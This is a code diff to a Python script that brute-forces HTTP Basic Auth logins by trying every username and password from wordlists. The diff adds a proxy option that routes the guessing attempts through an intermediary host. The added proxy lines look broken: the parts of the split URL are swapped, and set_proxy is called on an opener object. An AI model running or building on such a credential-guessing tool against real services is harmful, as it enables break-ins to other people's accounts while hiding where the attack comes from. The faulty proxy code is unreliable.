@@ -13,6 +13,7 @@ def prompt():
     parser.add_argument("-u", dest="usernames", help="path to username wordlist\n", type=str)
     parser.add_argument("-p", dest="passwords", help="path to password wordlist\n", type=str)
     parser.add_argument("-q","--quiet", help="quiet mode\n", action="store_true")
+    parser.add_argument("-x", dest="proxy", help="proxy support (eg: http://example.com:9999)\n", type=str)
     args = parser.parse_args()
     return args
     #parser.add_argument('-a')  #api
@@ -27,7 +28,7 @@ def clean(ufile, pfile):
         usernames = list(map(lambda line: line.strip(), usernames))
     return (usernames, passwords)
 
-def atk(u:list, p:list, url:str, q:bool):
+def atk(u:list, p:list, url:str, q:bool, x=None):
     """minimal bruteforce atk"""
     # forming the request & attacking
     password_mgr = urllib.request.HTTPPasswordMgrWithDefaultRealm() 
@@ -35,7 +36,10 @@ def atk(u:list, p:list, url:str, q:bool):
       for password in p:
         password_mgr.add_password(None, url, username, password) 
         handler = urllib.request.HTTPBasicAuthHandler(password_mgr) 
-        opener = urllib.request.build_opener(handler) 
+        opener = urllib.request.build_opener(handler)
+        if x:
+            host,proto = x.split("://")
+            opener.set_proxy(host, proto)
         urllib.request.install_opener(opener)
         if not q:
             print(f'trying combo: {username} X {password}')
